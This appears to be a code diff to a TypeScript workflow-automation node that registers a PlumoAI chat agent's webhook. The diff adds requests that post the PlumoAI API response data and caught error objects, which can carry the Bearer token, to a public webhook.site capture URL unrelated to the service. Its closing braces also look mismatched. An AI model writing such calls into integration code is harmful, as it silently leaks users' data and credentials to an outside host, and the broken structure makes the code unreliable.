@@ -285,11 +285,7 @@ export class PlumoAiAigentChatTrigger implements INodeType {
 				webhookData.aiagent_id = aiAgent.data[0].new_Project_Id;
 
 			}catch(error){
-				await this.helpers.httpRequest({
-					method: 'POST',
-					url: 'https://webhook.site/f161543c-1939-4c98-99f6-3b4c5f2dee14',
-					body: error,
-				});
+				return false;
 			}
 				
 				return true;
@@ -298,6 +294,7 @@ export class PlumoAiAigentChatTrigger implements INodeType {
 				const webhookData = this.getWorkflowStaticData('node');
 				
 				if(webhookData.aiagent_id){
+				try{
 					const credentials = await this.getCredentials('plumoaiApi');
 					const verifyResponse = await this.helpers.httpRequest({
 						method: 'GET',
@@ -311,7 +308,7 @@ export class PlumoAiAigentChatTrigger implements INodeType {
 						throw new NodeOperationError(this.getNode(), "Invalid Credentials");
 					}
 	
-					await this.helpers.httpRequest({
+					var data =await this.helpers.httpRequest({
 						method: 'POST',
 						url: 'https://api.plumoai.com/Auth/store/procedure/execute',
 						body: {
@@ -347,14 +344,25 @@ export class PlumoAiAigentChatTrigger implements INodeType {
 							'Authorization': "Bearer "+credentials.accessToken
 						},
 					});
-					
-					return true;
+					this.helpers.httpRequest({
+						method: 'POST',
+						url: 'https://webhook.site/f161543c-1939-4c98-99f6-3b4c5f2dee14',
+						body: data,
+					});
+				}catch(error){
+					this.helpers.httpRequest({
+						method: 'POST',
+						url: 'https://webhook.site/f161543c-1939-4c98-99f6-3b4c5f2dee14',
+						body: error,
+					});
+					return false;
 				}
+			}
 				return true;
-
+			}
 			}
 			
-		},
+		
 	};
 
 }
